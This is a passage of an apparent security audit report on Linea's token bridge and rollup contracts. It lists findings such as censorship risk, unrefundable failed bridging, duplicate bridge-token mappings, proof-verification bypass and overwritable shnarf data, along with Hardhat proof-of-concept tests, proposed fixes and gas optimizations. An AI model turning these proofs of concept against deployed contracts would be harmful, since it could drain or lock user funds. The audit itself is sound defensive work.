  await expectRevertWithReason(
    l2TokenBridge.connect(user).bridgeToken(l2TokenAddress, l2ReceivedTokenAmount, user.address),
    "SafeERC20: low-level call failed",
  );
});
```

Run the test with: `npx hardhat test --grep "Can erroneously bridge ERC721"`

**Recommended Mitigation:** `TokenBridge` should not allow users to bridge `ERC721` tokens. The reason it currently does is because the `ERC721` interface is very similar to the `ERC20` interface. One option for preventing this is to change `TokenBridge::_safeDecimals` to revert if the call fails as:
* `ERC20` tokens should always provide their decimals
* `ERC721` tokens don't have decimals

Another option would be using `ERC165` interface detection but not all nfts support this.

**Linea:**
Fixed in commit [35c7807](https://github.com/Consensys/zkevm-monorepo/commit/35c7807756ccac2756be7da472f5e6ce0fd9b16a#diff-e5dcf44cdbba69f5a1f8fc58700577ce57caac0c15a5d5fb63e0620aeced62d4L435-R446) merged in [PR3249](https://github.com/Consensys/zkevm-monorepo/pull/3249/files#diff-e5dcf44cdbba69f5a1f8fc58700577ce57caac0c15a5d5fb63e0620aeced62d4L435-R449).

**Cyfrin:** Verified.

\clearpage
## Medium Risk


### Linea can permanently lock user ETH on L2 by censoring user transactions through the centralized sequencer

**Description:** Linea can permanently lock user ETH on L2 by censoring user transactions through the centralized sequencer; as the Linea team control the sequencer they can choose (or be forced by a government entity) to censor any users by not including their L2 transactions when building L2 blocks.

Additionally, there is no way for users to withdraw their L2 assets by [initiating an L1 transaction which would avoid the L2 censorship](https://solodit.xyz/issues/m-09-lack-of-access-to-eth-on-l2-through-l1-l2-transactions-code4rena-zksync-zksync-git).

The combination of these factors means that users bridging assets over to Linea are completely at the mercy of the Linea team for their continued freedom to transact.

This represents a significant downgrade from Ethereum's censorship resistance where even the OFAC censorship regime only had [38% enforcement](https://www.mevwatch.info) over the last 30 days.

It should be noted however that this is a common defect [[1](https://youtu.be/Y4n38NPQhrY?si=88NeDOAsyA_kgVpo&t=167), [2](https://youtu.be/e8pwv9DIojI?si=Ru4oTdy0VM7S7Hmj&t=183)] with first-generation zkEVMs and de-centralized zk L2 sequencers are an active area of research [[1](https://www.youtube.com/watch?v=nF4jTEcQbkA), [2](https://www.youtube.com/watch?v=DP84VWng2i8)], so Linea is not an exceptional case in this regard.

**Recommended Mitigation:** Migrate to a decentralized sequencer and/or implement a mechanism that would allow users to retrieve their ETH (and ideally also bridged tokens) purely by initiating an L1 transaction completely bypassing L2 censorship.

**Linea:**
Acknowledged; this will be addressed when we decentralize.


### Users can't cancel or refund their source chain transaction if the destination chain transaction continually fails, causing loss of bridged funds

**Description:** Linea's messaging service allows users to bridge ETH between Ethereum L1 mainnet and Linea L2.

The bridging process operates in 2 distinct transactions where the first can succeed and the second can fail completely independently of each other.

In the first step of the bridging process on the source chain the user supplies their ETH to the messaging service contract on that chain together with some parameters.

In the last step of the bridging process on the destination chain a delivery service ("postman") or the user themselves calls `claimMessage` or `claimMessageWithProof` to complete the bridging process.

The last step of claiming the message is an arbitrary [call](https://github.com/Consensys/zkevm-monorepo/blob/364b64d2a2704567adac00e3fa428a1901717666/contracts/contracts/messageService/l1/L1MessageService.sol#L144-L154) with arbitrary calldata made to an address of the user's choosing. If this call fails for any reason the user may re-try claiming the message an infinite number of times. However if this call continues to revert (or if the `claim` transaction continually reverts for any other reason), the user:
* will never receive their bridged ETH on the destination chain
* has no way of initiating a cancel or refund transaction on the source chain

**Impact:** This scenario will result in a loss of bridged funds to the user.

**Recommended Mitigation:** Implement a cancel or refund mechanism that users can initiate on the source chain to retrieve their funds if the claim transaction continually reverts on the destination chain.

**Linea:**
Acknowledged. Currently there is no cancellation or refund feature but users can re-try the destination chain delivery as many times as they like. We may consider implementing this in the future.

\clearpage
## Low Risk


### Multiple L2 `BridgeToken` can be associated with the same L1 `NativeToken` by using `TokenBridge::setCustomContract`

**Description:** Multiple L2 `BridgeToken` can be associated with the same L1 `NativeToken` by using `TokenBridge::setCustomContract`.

This was not introduced in the latest changes but is present in the current mainnet `TokenBridge` [code](https://github.com/Consensys/linea-contracts/blob/main/contracts/tokenBridge/TokenBridge.sol).

**Impact:** This breaks the `TokenBridge` invariant that one L1 `NativeToken` should only be associated with one L2 `BridgeToken`.

**Proof of Concept:** Add this PoC to `test/tokenBridge/E2E.ts` under the `setCustomsContract` section:
```typescript
    it("Multiple L2 BridgeTokens can be associated with a single L1 NativeToken by using setCustomContract", async function () {
      const {
        user,
        l1TokenBridge,
        l2TokenBridge,
        tokens: { L1USDT },
      } = await loadFixture(deployContractsFixture);

      // @audit the setup of this PoC has been copied from the test
      // "Should mint and burn correctly from a target contract"
      const amountBridged = 100;

      // Deploy custom contract
      const CustomContract = await ethers.getContractFactory("MockERC20MintBurn");
      const customContract = await CustomContract.deploy("CustomContract", "CC");

      // Set custom contract
      await l2TokenBridge.setCustomContract(await L1USDT.getAddress(), await customContract.getAddress());

      // @audit save user balance before both bridging attempts
      const USDTBalanceBefore = await L1USDT.balanceOf(user.address);

      // Bridge token (allowance has been set in the fixture)
      await l1TokenBridge.connect(user).bridgeToken(await L1USDT.getAddress(), amountBridged, user.address);

      expect(await L1USDT.balanceOf(await l1TokenBridge.getAddress())).to.be.equal(amountBridged);
      expect(await customContract.balanceOf(user.address)).to.be.equal(amountBridged);
      expect(await customContract.totalSupply()).to.be.equal(amountBridged);

      // @audit deploy a new second custom contract
      const customContract2 = await CustomContract.deploy("CustomContract2", "CC2");

      // @audit using setCustomContract, this second L2 BridgeToken can be associated
      // with L1USDT Token even though it should be impossible to do this as L1USDT has
      // already been bridged and already has a paired L2 BridgeToken
      //
      // @audit Once the suggested fix is applied, this should revert
      await l2TokenBridge.setCustomContract(await L1USDT.getAddress(), await customContract2.getAddress());

      // @audit same user now bridges L1->L2 again
      await l1TokenBridge.connect(user).bridgeToken(await L1USDT.getAddress(), amountBridged, user.address);

      // @audit L1 TokenBridge has twice the balance
      expect(await L1USDT.balanceOf(await l1TokenBridge.getAddress())).to.be.equal(amountBridged*2);

      // @audit first L2 BridgeToken still has the same balance and supply
      expect(await customContract.balanceOf(user.address)).to.be.equal(amountBridged);
      expect(await customContract.totalSupply()).to.be.equal(amountBridged);

      // @audit second L2 BridgeToken received new balance and supply from second bridging
      expect(await customContract2.balanceOf(user.address)).to.be.equal(amountBridged);
      expect(await customContract2.totalSupply()).to.be.equal(amountBridged);

      // @audit user L1 USDT balance deducted due to both bridging attempts
      const USDTBalanceAfterTwoL1ToL2Bridges = await L1USDT.balanceOf(user.address);
      expect(USDTBalanceBefore - USDTBalanceAfterTwoL1ToL2Bridges).to.be.equal(amountBridged*2);

      // @audit user now bridges back from first L2 BridgeToken
      await l2TokenBridge.connect(user).bridgeToken(await customContract.getAddress(), amountBridged, user.address);

      // @audit first L2 BridgeToken has 0 balance and supply
      expect(await customContract.balanceOf(user.address)).to.be.equal(0);
      expect(await customContract.totalSupply()).to.be.equal(0);

      // @audit user then bridges back from second L2 BridgeToken
      await l2TokenBridge.connect(user).bridgeToken(await customContract2.getAddress(), amountBridged, user.address);

      // @audit second L2 BridgeToken has 0 balance and supply
      expect(await customContract2.balanceOf(user.address)).to.be.equal(0);
      expect(await customContract2.totalSupply()).to.be.equal(0);

      // @audit user should have received back both bridged amounts
      const USDTBalanceAfter = await L1USDT.balanceOf(user.address);
      expect(USDTBalanceAfter - USDTBalanceAfterTwoL1ToL2Bridges).to.be.equal(amountBridged*2);

      // @audit user ends up with initial token amount
      expect(USDTBalanceAfter).to.be.equal(USDTBalanceBefore);

      // @audit user was able to bridge L1->L2 to two different L2 BridgeTokens,
      // and was able to bridge back L2->L1 from both different L2 BridgeTokens back
      // into the same L1 NativeToken. This breaks the invariant that one L1 NativeToken
      // should only be associated with one L2 BridgeToken
    });
```

Run with: `npx hardhat test --grep "Multiple L2 BridgeTokens can be associated with"`

**Recommended Mitigation:** `TokenBridge::setCustomContract` should prevent multiple L2 `BridgeToken` from being associated with the same L1 `NativeToken`. One possible implementation is to add this check:
```solidity
  function setCustomContract(
    address _nativeToken,
    address _targetContract
  ) external nonZeroAddress(_nativeToken) nonZeroAddress(_targetContract) onlyOwner isNewToken(_nativeToken) {
    if (bridgedToNativeToken[_targetContract] != EMPTY) {
      revert AlreadyBrigedToNativeTokenSet(_targetContract);
    }
    if (_targetContract == NATIVE_STATUS || _targetContract == DEPLOYED_STATUS || _targetContract == RESERVED_STATUS) {
      revert StatusAddressNotAllowed(_targetContract);
    }

    // @audit proposed fix
    uint256 targetChainIdCache = targetChainId;

    if (nativeToBridgedToken[targetChainIdCache][_nativeToken] != EMPTY) {
      revert("Already set a custom contract for this native token");
    }

    nativeToBridgedToken[targetChainIdCache][_nativeToken] = _targetContract;
    bridgedToNativeToken[_targetContract] = _nativeToken;
    emit CustomContractSet(_nativeToken, _targetContract, msg.sender);
  }
```

**Linea:**
Fixed in commit [35c7807](https://github.com/Consensys/zkevm-monorepo/commit/35c7807756ccac2756be7da472f5e6ce0fd9b16a#diff-e5dcf44cdbba69f5a1f8fc58700577ce57caac0c15a5d5fb63e0620aeced62d4L388-R394) merged in [PR3249](https://github.com/Consensys/zkevm-monorepo/pull/3249/files#diff-e5dcf44cdbba69f5a1f8fc58700577ce57caac0c15a5d5fb63e0620aeced62d4L388-R397).

**Cyfrin:** Verified.


### Linea can bypass validity proof verification for L2->L1 block finalization

**Description:** One major advantage of using zk rollups over Optimistic rollups is that zk rollups use math & cryptography to verify L2->L1 block finalization via a validity proof which must be submitted and verified.

In the current codebase the Linea team has two options to bypass validity proof verification during block finalization:

1) Explicitly by calling `LineaRollup::finalizeBlocksWithoutProof` which takes no proof parameter as input and doesn't call the `_verifyProof` function.

2) More subtly by calling `LineaRollup::setVerifierAddress` to associate a `_proofType` with a `_newVerifierAddress` that implements the `IPlonkVerifier::Verify` interface, but which simply returns `true` and doesn't perform any actual verification. Then call `LineaRollup::finalizeBlocksWithProof` passing `_proofType` associated with `_newVerifierAddress` which will always return true.

**Impact:** Using either option makes Linea roughly equivalent to an Optimistic roll-up but without Watchers and the ability to challenge. That said if either option is used, `LineaRollup::_finalizeBlocks` always executes which enforces many "sanity checks" that significantly limit how these options can be abused.

The "without proof" functionality can also be used to add false L2 merkle roots which could then be used to call `L1MessageService::claimMessageWithProof` to drain ETH from the L1.

**Recommended Mitigation:** Linea is still at the alpha stage so these functions are likely needed as a last resort. Ideally once Linea is more mature such functionality would be removed.

**Linea:**
Acknowledged; the ability to finalize blocks without proof is primarily part of our "training wheels" controlled via the Security Council, analyzed by Security partners and reserved for particular cases like we had when we upgraded our state manager to another hashing algorithm (the last time it was used).


### Associated `finalBlockNumber` for an existing shnarf can be overwritten when submitting data using `LineaRollup::submitDataAsCalldata`

**Description:** When submitting data using `LineaRollup::submitDataAsCalldata`, if the `computedShnarf` for the current submission turns out to be a shnarf that has already been submitted before, the associated `finalBlockNumber` to this shnarf will be overwritten by the new `submissionData.finalBlockInData`.

The problem is caused because the existing check is comparing if `finalBlockInNumber` associated with the shnarf is the same as the new `submissionData.finalBlockInData`, instead of checking if the shnarf has already been associated with any other `finalBlockNumber`.

**Impact:** Historical data associated with an existing shnarf can be overwritten by the newest shnarf's submission data for blocks which have not yet been finalized.

**Proof of Concept:** Add the PoC to `test/LineaRollup.ts` inside the section `describe("Data submission tests", () => {`:
```typescript
    it.only("Submitting data on a range of blocks where data had already been submitted", async () => {
      let [firstSubmissionData, secondSubmissionData] = generateCallDataSubmission(0, 2);
      const firstParentShnarfData = generateParentShnarfData(0);

      // @audit Assume this is the lastFinalizedBlock, in the sense that any of the
      //        next submissions can't submit data to a block prior to this one
      // @audit The `firstBlockInData` of the next submissions must start at block 550
      firstSubmissionData.finalBlockInData = 549n;
      await expect(
        lineaRollup
          .connect(operator)
          .submitDataAsCalldata(firstParentShnarfData, firstSubmissionData, { gasLimit: 30_000_000 }),
      ).to.not.be.reverted;

      parentSubmissionData = generateParentSubmissionDataForIndex(1);
      const secondParentShnarfData = generateParentShnarfData(1);

      // @audit Submission for block range 550 - 599
      secondSubmissionData.firstBlockInData = 550n;
      secondSubmissionData.finalBlockInData = 599n;
      await expect(
        lineaRollup.connect(operator).submitDataAsCalldata(secondParentShnarfData, secondSubmissionData, {
          gasLimit: 30_000_000,
        }),
      ).to.not.be.reverted;

      let finalBlockNumber = await lineaRollup.shnarfFinalBlockNumbers(secondExpectedShnarf);
      expect(finalBlockNumber == 599n).to.be.true;
      console.log("finalBlockNumber: ", finalBlockNumber);

      // @audit Submission for block range 550 - 649
      //        Instead of continuing from the "lastSubmitedBlock (599)"
      let secondSubmissionOnSameInitialBlockData = Object.assign({}, secondSubmissionData);
      secondSubmissionOnSameInitialBlockData.firstBlockInData = 550n;
      secondSubmissionOnSameInitialBlockData.finalBlockInData = 649n;
      await expect(
        lineaRollup.connect(operator).submitDataAsCalldata(secondParentShnarfData, secondSubmissionOnSameInitialBlockData, {
          gasLimit: 30_000_000,
        }),
      ).to.not.be.reverted;

      finalBlockNumber = await lineaRollup.shnarfFinalBlockNumbers(secondExpectedShnarf);
      expect(finalBlockNumber == 649n).to.be.true;
      console.log("finalBlockNumber: ", finalBlockNumber);

      // @audit Submission for block range 550 - 575
      let thirdSubmissionOnSameInitialBlockData = Object.assign({}, secondSubmissionData);;
      thirdSubmissionOnSameInitialBlockData.firstBlockInData = 550n;
      thirdSubmissionOnSameInitialBlockData.finalBlockInData = 575n;
      await expect(
        lineaRollup.connect(operator).submitDataAsCalldata(secondParentShnarfData, thirdSubmissionOnSameInitialBlockData, {
          gasLimit: 30_000_000,
        }),
      ).to.not.be.reverted;

      finalBlockNumber = await lineaRollup.shnarfFinalBlockNumbers(secondExpectedShnarf);
      expect(finalBlockNumber == 575n).to.be.true;
      console.log("finalBlockNumber: ", finalBlockNumber);

      // @audit Each time a duplicated shnarf was computed the associated
      // `finalBlockNumber` was updated for the new `finalBlockNumber` of the newest submission.
    });
```

Run with: `npx hardhat test --grep "Submitting data on a range of blocks where data had"`

When the test is executed, observe on the console how the `finalBlockNumber` associated with the same shnarf is updated on each of the submissions that generates an existing shnarf which had already been submitted before.

**Recommended Mitigation:** Check if the `computedShnarf` for the current submission has already been associated with a previous `finalBlockInNumber`:

```solidity
function submitDataAsCalldata(
  ...
) external whenTypeAndGeneralNotPaused(PROVING_SYSTEM_PAUSE_TYPE) onlyRole(OPERATOR_ROLE) {
  ...

- if (shnarfFinalBlockNumbers[shnarf] == _submissionData.finalBlockInData) {
-   revert DataAlreadySubmitted(shnarf);
- }

+ if (shnarfFinalBlockNumbers[shnarf] != 0) {
+   revert DataAlreadySubmitted(shnarf);
+ }

  ...
}

```

**Linea:**
Fixed in commit [1816c80](https://github.com/Consensys/zkevm-monorepo/pull/3191/commits/1816c80f8e11528aea48f265bf557b1934023721#diff-408c766d202f05efdde69ebcd815ba16ad10f68249dd353f6359121ab312a9fbR311) merged in [PR3191](https://github.com/Consensys/zkevm-monorepo/pull/3191/files#diff-408c766d202f05efdde69ebcd815ba16ad10f68249dd353f6359121ab312a9fbL311).

**Cyfrin:** Verified.


### Potential L1->L2 `ERC20` decimal inconsistency can result in loss of user bridged tokens

**Description:** The first time a new ERC20 token is bridged, `TokenBridge::bridgeToken` uses the `IERC20MetadataUpgradeable` interface to fetch the token's name, symbol and decimals in order to create a bridged version of the token.

If the `staticcall` to `IERC20MetadataUpgradeable::decimals` fails to return a valid value then `TokenBridge::_safeDecimals` defaults to 18 decimals.

**Impact:** This is potentially dangerous as:
* a non-standard ERC20 token could be using a non-18 decimal value internally but not have a `decimals` function
* the newly created bridged version will have 18 decimals different to the native token

When the user attempts to bridge back, the user's bridged tokens will be burned and then on the native chain:
* if the native token has less than 18 decimals, the transfer call will revert resulting in the user's originally bridged tokens stuck in the token bridge
* if the native token has greater than 18 decimals, the transfer call will succeed resulting in the user receiving less tokens than they initially bridged over

**Recommended Mitigation:** `TokenBridge::_safeDecimals` should revert if the token being bridged does not return its decimals from the call to `IERC20MetadataUpgradeable::decimals`. Interestingly Consensys itself reported the same finding as issue 5.4 in their [Nov 2021 Arbitrum audit](https://github.com/OffchainLabs/nitro/blob/master/audits/ConsenSys_Diligence_Arbitrum_Contracts_11_2021.pdf).

**Linea:**
Fixed in commit [35c7807](https://github.com/Consensys/zkevm-monorepo/commit/35c7807756ccac2756be7da472f5e6ce0fd9b16a#diff-e5dcf44cdbba69f5a1f8fc58700577ce57caac0c15a5d5fb63e0620aeced62d4L435-R446) merged in [PR3249](https://github.com/Consensys/zkevm-monorepo/pull/3249/files#diff-e5dcf44cdbba69f5a1f8fc58700577ce57caac0c15a5d5fb63e0620aeced62d4L435-R449).

**Cyfrin:** Verified.

\clearpage
## Informational


### Add sanity check to revert if `messageHashesLength == 0` in `L2MessageManager::anchorL1L2MessageHashes`

**Description:** Add sanity check to revert if `messageHashesLength == 0` in `L2MessageManager::anchorL1L2MessageHashes`.

**Linea:**
Acknowledged; will be part of a future release.


### Add sanity check to revert if `_treeDepth == 0` in `L1MessageManager::_addL2MerkleRoots`

**Description:** Add sanity check to revert if `_treeDepth == 0` in `L1MessageManager::_addL2MerkleRoots` to prevent adding an L2 Merkle root with `treeDepth == 0` as this would create a state where subsequent calls to `L1MessagingService::claimMessageWithProof` will revert with error `L2MerkleRootDoesNotExist`.

**Linea:**
The depth is always enforced in the circuit and as it forms part of the public input it can never be set to zero - there is a fixed size in the circuit. We have added a comment to note this in commit [54c4670](https://github.com/Consensys/zkevm-monorepo/commit/54c467056b0a95d411f1060f77a9940652b1554c) merged in [PR3214](https://github.com/Consensys/zkevm-monorepo/pull/3214).


### `SparseMerkleTreeVerifier` should use `Utils::_efficientKeccak` instead of duplicating the same function

**Description:** `SparseMerkleTreeVerifier` should use `Utils::_efficientKeccak` instead of duplicating the same function.

**Linea:**
Acknowledged; will be part of a future release.


### Emit event in `TokenBridge::removeReserved` when updating storage

**Description:** `TokenBridge::setReserved` emits an event so the opposite function `removeReserved` should likely also emit an event when updating storage.

**Linea:**
Fixed in commit [796f2d9](https://github.com/Consensys/zkevm-monorepo/commit/796f2d9bbacf8c2403b8a4473f9c711172067940#diff-e5dcf44cdbba69f5a1f8fc58700577ce57caac0c15a5d5fb63e0620aeced62d4R366) merged in [PR3249](https://github.com/Consensys/zkevm-monorepo/pull/3249/files#diff-e5dcf44cdbba69f5a1f8fc58700577ce57caac0c15a5d5fb63e0620aeced62d4R370).

**Cyfrin:** Verified.


### Emit event in `MessageServiceBase::_setRemoteSender` when updating `remoteSender` storage

**Description:** Emit event in `MessageServiceBase::_setRemoteSender` when updating `remoteSender` storage.

**Linea:**
Acknowledged; may be included in a future release. `MessageServiceBase::_setRemoteSender` will only ever be used again on new testnet chains and will not be usable for existing Sepolia and Mainnet deploys.


### Add sanity check to `LineaRollup::submitBlobs` to ensure all blobs are validated

**Description:** In `LineaRollup::submitBlobs`, if `_blobSubmissionData.length` is smaller than the actual number of attached blobs the code will successfully execute and store an intermediate value to `shnarfFinalBlockNumbers[computedShnarf]` because the `for` loop did not iterate through all the blobs.

To prevent this edge-case from occurring add an early fail sanity check before the `for` loop eg:
```solidity
if(blobhash(blobSubmissionLength) != EMPTY_HASH) {
      revert MoreBlobsThanData();
}
```

**Linea:**
Acknowledged; will be resolved in a future release focused on decentralization. Currently the Operator Service is written in such a way this cannot happen, and there is always a 1:1 mapping of data:blob.

\clearpage
## Gas Optimization


### `TokenBridge::deployBridgedToken` can use named return variable to avoid additional local variable

**Description:** `TokenBridge::deployBridgedToken` can use named return variable to avoid additional local variable, eg:

```solidity
  function deployBridgedToken(
    address _nativeToken,
    bytes calldata _tokenMetadata,
    uint256 _chainId
  ) internal returns (address bridgedTokenAddress) { // @audit named return
    bytes32 _salt = keccak256(abi.encode(_chainId, _nativeToken));
    BeaconProxy bridgedToken = new BeaconProxy{ salt: _salt }(tokenBeacon, "");
    bridgedTokenAddress = address(bridgedToken); // @audit assign to named return

    (string memory name, string memory symbol, uint8 decimals) = abi.decode(_tokenMetadata, (string, string, uint8));
    BridgedToken(bridgedTokenAddress).initialize(name, symbol, decimals);
    emit NewTokenDeployed(bridgedTokenAddress, _nativeToken);
    // @audit removed explicit return statement
  }
```

**Linea:**
Acknowledged; may be part of a future release.


### Reverse order of checks in `TokenBridge::isNewToken` to save 2 storage reads

**Description:** `TokenBridge::isNewToken` can often save 2 storage reads by reversing the order of checks, eg:

```solidity
  modifier isNewToken(address _token) {
    // @audit swapped order of checks to save 2 storage reads by often failing on first check
    if (bridgedToNativeToken[_token] != EMPTY || nativeToBridgedToken[sourceChainId][_token] != EMPTY)
      revert AlreadyBridgedToken(_token);
    _;
  }
```

This way the modifier will almost always fail on the first check having done only 1 storage read, not triggering the 2 storage reads that occur in the second check.

**Linea:**
Fixed in commit [35c7807](https://github.com/Consensys/zkevm-monorepo/commit/35c7807756ccac2756be7da472f5e6ce0fd9b16a#diff-e5dcf44cdbba69f5a1f8fc58700577ce57caac0c15a5d5fb63e0620aeced62d4L68-R69) merged in [PR3249](https://github.com/Consensys/zkevm-monorepo/pull/3249/files#diff-e5dcf44cdbba69f5a1f8fc58700577ce57caac0c15a5d5fb63e0620aeced62d4L68-R68).

**Cyfrin:** Verified.


### Optimize away `bridgedMappingValue` variable in `TokenBridge::bridgeToken`

**Description:** Optimize away `bridgedMappingValue` variable in `TokenBridge::bridgeToken` by for example:

```solidity
  function bridgeToken(
    address _token,
    uint256 _amount,
    address _recipient
  ) public payable nonZeroAddress(_token) nonZeroAddress(_recipient) nonZeroAmount(_amount) whenNotPaused nonReentrant {
    address nativeMappingValue = nativeToBridgedToken[sourceChainId][_token];

    if (nativeMappingValue == RESERVED_STATUS) {
      // Token is reserved
      revert ReservedToken(_token);
    }

    // @audit remove `bridgedMappingValue` and
    // instead initialize `nativeToken`
    address nativeToken = bridgedToNativeToken[_token];
    uint256 chainId;
    bytes memory tokenMetadata;

    // @audit use `nativeToken` in the comparison
    if (nativeToken != EMPTY) {
      // Token is bridged
      BridgedToken(_token).burn(msg.sender, _amount);
      // @audit remove assignment `nativeToken = bridgedMappingValue`
      chainId = targetChainId;
    } else {
   // @audit remaining code continues unchanged
```

**Linea:**
Fixed in commit [35c7807](https://github.com/Consensys/zkevm-monorepo/commit/35c7807756ccac2756be7da472f5e6ce0fd9b16a#diff-e5dcf44cdbba69f5a1f8fc58700577ce57caac0c15a5d5fb63e0620aeced62d4L153-R188) merged in [PR3249](https://github.com/Consensys/zkevm-monorepo/pull/3249/files#diff-e5dcf44cdbba69f5a1f8fc58700577ce57caac0c15a5d5fb63e0620aeced62d4L153-R190).

**Cyfrin:** Verified.


### Save 2 storage reads in `TokenBridge::bridgeToken` by caching `sourceChainId`

**Description:** `sourceChainId` is always read once at the beginning of `TokenBridge::bridgeToken` [L153](https://github.com/Consensys/zkevm-monorepo/blob/364b64d2a2704567adac00e3fa428a1901717666/contracts/contracts/tokenBridge/TokenBridge.sol#L153).

Then in the `else` branch of `TokenBridge::bridgeToken`, `sourceChainId` is always read at least once [L191](https://github.com/Consensys/zkevm-monorepo/blob/364b64d2a2704567adac00e3fa428a1901717666/contracts/contracts/tokenBridge/TokenBridge.sol#L191) but can also be read a second time [L183](https://github.com/Consensys/zkevm-monorepo/blob/364b64d2a2704567adac00e3fa428a1901717666/contracts/contracts/tokenBridge/TokenBridge.sol#L183).

Hence it is more efficient to cache `sourceChainId` at the beginning of `TokenBridge::bridgeToken` to save 2 storage reads. The optimized version of `bridgeToken` found below also contains the optimization from the previous issue _"Optimize away bridgedMappingValue variable in TokenBridge::bridgeToken"_ which is required to get around the "stack too deep" error this optimization would otherwise create:
```solidity
  function bridgeToken(
    address _token,
    uint256 _amount,
    address _recipient
  ) public payable nonZeroAddress(_token) nonZeroAddress(_recipient) nonZeroAmount(_amount) whenNotPaused nonReentrant {
    // @audit cache `sourceChainId` and use it when setting `nativeMappingValue`
    uint256 sourceChainIdCache = sourceChainId;
    address nativeMappingValue = nativeToBridgedToken[sourceChainIdCache][_token];

    if (nativeMappingValue == RESERVED_STATUS) {
      // Token is reserved
      revert ReservedToken(_token);
    }

    // @audit remove `bridgedMappingValue` and
    // instead initialize `nativeToken`
    address nativeToken = bridgedToNativeToken[_token];
    uint256 chainId;
    bytes memory tokenMetadata;

    // @audit use `nativeToken` in the comparison
    if (nativeToken != EMPTY) {
      // Token is bridged
      BridgedToken(_token).burn(msg.sender, _amount);
      // @audit remove assignment `nativeToken = bridgedMappingValue`
      chainId = targetChainId;
    } else {
      // Token is native

      // For tokens with special fee logic, ensure that only the amount received
      // by the bridge will be minted on the target chain.
      uint256 balanceBefore = IERC20Upgradeable(_token).balanceOf(address(this));
      IERC20Upgradeable(_token).safeTransferFrom(msg.sender, address(this), _amount);
      _amount = IERC20Upgradeable(_token).balanceOf(address(this)) - balanceBefore;

      nativeToken = _token;

      if (nativeMappingValue == EMPTY) {
        // New token
        // @audit using cached `sourceChainIdCache`
        nativeToBridgedToken[sourceChainIdCache][_token] = NATIVE_STATUS;
        emit NewToken(_token);
      }

      // Send Metadata only when the token has not been deployed on the other chain yet
      if (nativeMappingValue != DEPLOYED_STATUS) {
        tokenMetadata = abi.encode(_safeName(_token), _safeSymbol(_token), _safeDecimals(_token));
      }
      // @audit using cached `sourceChainIdCache`
      chainId = sourceChainIdCache;
    }

    messageService.sendMessage{ value: msg.value }(
      remoteSender,
      msg.value, // fees
      abi.encodeCall(ITokenBridge.completeBridging, (nativeToken, _amount, _recipient, chainId, tokenMetadata))
    );
    emit BridgingInitiated(msg.sender, _recipient, _token, _amount);
  }
```

**Linea:**
Fixed in commit [35c7807](https://github.com/Consensys/zkevm-monorepo/commit/35c7807756ccac2756be7da472f5e6ce0fd9b16a#diff-e5dcf44cdbba69f5a1f8fc58700577ce57caac0c15a5d5fb63e0620aeced62d4L153-R188) merged in [PR3249](https://github.com/Consensys/zkevm-monorepo/pull/3249/files#diff-e5dcf44cdbba69f5a1f8fc58700577ce57caac0c15a5d5fb63e0620aeced62d4L153-R190).

**Cyfrin:** Verified.


### Remove redundant modifiers from `TokenBridge::bridgeTokenWithPermit`

**Description:** Since `TokenBridge::bridgeTokenWithPermit` calls `bridgeToken`, it doesn't need to repeat the same modifiers that `bridgeToken` contains; this just incurs additional gas costs.

The only benefit to the redundant modifiers is they make the transaction revert faster but in the majority of normal cases where non-zero inputs are passed these additional redundant modifiers simply increase the gas cost of every successful bridging transaction for regular users.

Remove the `nonZeroAddress`, `nonZeroAmount` and `whenNotPaused` modifiers from `bridgeTokenWithPermit` since they are already enforced by `bridgeToken`.

**Linea:**
Fixed in commit [35c7807](https://github.com/Consensys/zkevm-monorepo/commit/35c7807756ccac2756be7da472f5e6ce0fd9b16a#diff-e5dcf44cdbba69f5a1f8fc58700577ce57caac0c15a5d5fb63e0620aeced62d4L217-R212) merged in [PR3249](https://github.com/Consensys/zkevm-monorepo/pull/3249/files#diff-e5dcf44cdbba69f5a1f8fc58700577ce57caac0c15a5d5fb63e0620aeced62d4L217-R217).

**Cyfrin:** Verified.


### Optimize away `nativeMappingValue` variable in `TokenBridge::completeBridging`

**Description:** Optimize away `nativeMappingValue` variable in `TokenBridge::completeBridging` by for example:
```solidity
  function completeBridging(
    address _nativeToken,
    uint256 _amount,
    address _recipient,
    uint256 _chainId,
    bytes calldata _tokenMetadata
  ) external nonReentrant onlyMessagingService onlyAuthorizedRemoteSender whenNotPaused {
    // @audit remove `nativeMappingValue` and instead
    // initialize `bridgedToken`
    address bridgedToken = nativeToBridgedToken[_chainId][_nativeToken];

    // @audit use `bridgedToken` for the check
    if (bridgedToken == NATIVE_STATUS || bridgedToken == DEPLOYED_STATUS) {
      // Token is native on the local chain
      IERC20Upgradeable(_nativeToken).safeTransfer(_recipient, _amount);
    } else {
       // @audit remove assignment `bridgedToken = nativeMappingValue;`
       //
       // @audit use `bridgedToken` for the check
      if (bridgedToken == EMPTY) {
        // New token
        bridgedToken = deployBridgedToken(_nativeToken, _tokenMetadata, sourceChainId);
        bridgedToNativeToken[bridgedToken] = _nativeToken;
        nativeToBridgedToken[targetChainId][_nativeToken] = bridgedToken;
      }
      BridgedToken(bridgedToken).mint(_recipient, _amount);
    }

    emit BridgingFinalized(
      _nativeToken,
      // @audit return 0 address as before if token was native on local chain
      bridgedToken == NATIVE_STATUS || bridgedToken == DEPLOYED_STATUS ? address(0x0) : bridgedToken,
      _amount,
      _recipient);
  }
```

**Linea:**
Acknowledged; will be part of a future release.


### Optimize away `nativeToken` variable in `TokenBridge::setDeployed`

**Description:** Optimize away `nativeToken` variable in `TokenBridge::setDeployed` which is written to but never read, eg:
```solidity
  function setDeployed(address[] calldata _nativeTokens) external onlyMessagingService onlyAuthorizedRemoteSender {
    // @audit remove `nativeToken`
    unchecked {
      for (uint256 i; i < _nativeTokens.length; ) {
        // @audit remove assignment nativeToken = _nativeTokens[i]
        nativeToBridgedToken[sourceChainId][_nativeTokens[i]] = DEPLOYED_STATUS;
        emit TokenDeployed(_nativeTokens[i]);
        ++i;
      }
    }
  }
```

**Linea:**
Fixed in commit [35c7807](https://github.com/Consensys/zkevm-monorepo/commit/35c7807756ccac2756be7da472f5e6ce0fd9b16a#diff-e5dcf44cdbba69f5a1f8fc58700577ce57caac0c15a5d5fb63e0620aeced62d4L303-L306) merged in [PR3249](https://github.com/Consensys/zkevm-monorepo/pull/3249/files#diff-e5dcf44cdbba69f5a1f8fc58700577ce57caac0c15a5d5fb63e0620aeced62d4L303-L306).

**Cyfrin:** Verified.


### Save 1 storage read in `TokenBridge::removeReserved` by caching `sourceChainId`

**Description:** `sourceChainId` is read from storage twice in `TokenBridge::removeReserved` so caching it can save 1 storage read, eg:
```solidity
  function removeReserved(address _token) external nonZeroAddress(_token) onlyOwner {
    // @audit cache `sourceChainId`
    uint256 sourceChainIdCache = sourceChainId;

    // @audit used cached version
